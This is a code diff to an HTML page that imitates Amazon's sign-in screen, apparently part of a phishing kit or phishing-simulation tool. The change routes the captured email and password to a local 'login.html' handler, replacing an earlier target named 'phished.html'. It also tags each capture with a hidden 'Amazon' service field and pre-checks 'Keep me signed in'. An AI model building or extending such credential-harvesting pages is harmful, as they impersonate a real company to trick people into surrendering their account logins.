@@ -11,7 +11,6 @@
 
     <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
     <link href="//fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
-    <link href="../reset.css" rel="stylesheet" />
     <link href="amazon.css" rel="stylesheet" />
 
   </head>
@@ -28,20 +27,21 @@
           <img src="amazon-logo.png" alt="Amazon" />
         </div>
 
-        <!-- form object -->
-        <form class="amazon-form" action="../phished.html" method="POST" autocomplete="off">
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="amazon-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Amazon" />
 
           <!-- default heading -->
           <div class="amazon-heading">
             <h1>Sign in</h1>
           </div>
 
-          <!-- email input -->
-          <div class="amazon-input amazon-email">
+          <!-- username input -->
+          <div class="amazon-input amazon-username">
             <div class="amazon-input-label">
               <span>Email (phone for mobile accounts)</span>
             </div>
-            <input type="text" name="_email" value="" />
+            <input type="text" name="_username" value="" />
           </div>
 
           <!-- hidden password input -->
@@ -67,7 +67,7 @@
 
           <!-- remember checkbox -->
           <div class="amazon-remember">
-            <input type="checkbox" name="_remember" value="true" tabindex="4" />
+            <input type="checkbox" name="_remember" checked />
             <span>Keep me signed in. &nbsp; <a href="javascript:void(0)">Details</a></span>
           </div>
 
